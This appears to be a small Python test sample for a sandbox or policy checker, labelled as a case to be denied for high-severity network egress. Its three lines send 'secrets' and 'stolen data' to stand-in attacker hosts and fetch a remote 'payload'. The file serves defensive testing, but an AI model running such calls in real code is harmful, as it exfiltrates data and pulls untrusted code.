# Sample 04: Network exfiltration to non-allow-listed host.
# Should be DENIED (network_egress, HIGH).
import requests
import socket

requests.get("https://evil.example.com/exfil?data=secrets")

s = socket.socket()
s.connect(("attacker.evil.io", 4444))
s.send(b"stolen data")

import urllib.request
urllib.request.urlopen("http://malware.badcorp.net/payload")
